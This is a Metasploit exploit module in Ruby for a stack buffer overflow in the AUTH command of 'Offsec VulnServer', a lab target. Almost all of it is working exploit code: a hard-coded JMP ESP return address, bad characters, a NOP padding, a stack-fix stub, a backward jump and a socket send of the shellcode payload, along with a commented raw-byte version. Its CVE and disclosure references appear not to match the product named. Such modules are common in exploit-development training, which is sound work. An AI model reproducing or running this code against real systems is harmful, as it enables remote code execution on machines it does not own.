##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Offsec VulnServer Auth Buffer Overflow',
      'Description'    => %q{
         Buffer overflow in Offsec VulnServer, wgen sending a AUTH command with
         excessive length. 
      },
      'Author'         => 'offsec',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2003-0264'],
          ['OSVDB', '11975'],
          ['BID', '7519'],
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'    => 800,
          'BadChars' => "\x00\x0a\x0d\x20",
          'MinNops'  => 100,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Universal JMP ESP address', { 'Ret' => 0x65d11d71} ]
        ],
      'DisclosureDate' => 'May 07 2003',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(5555)
      ])

  end

  def exploit
    connect

    print_status("Trying #{target.name} using jmp esp at #{"%.8x" % target.ret}")
    
    #ret = "\x71\x1d\xd1\x65"
    #espfix = "\x81\xc4\x54\xf2\xff\xff"
    #jmp = "\xe9\xf9\xfb\xff\xff"
    #req1 = "AUTH " + "\x90"*40 + shellcode + "\xcc"* 256 + ret + espfix + jmp + "\x43"*400   
    
    request = "AUTH " + make_nops(40)
    request << payload.encoded
    request << make_nops(1000-payload.encoded.length)
    request << [target.ret].pack('V')
    request << "\x81\xc4\x54\xf2\xff\xff"
    request << "\xe9\xf9\xfb\xff\xff"
    request << rand_text_alpha(400)

    sock.put(request)

    handler
    disconnect
  end
end
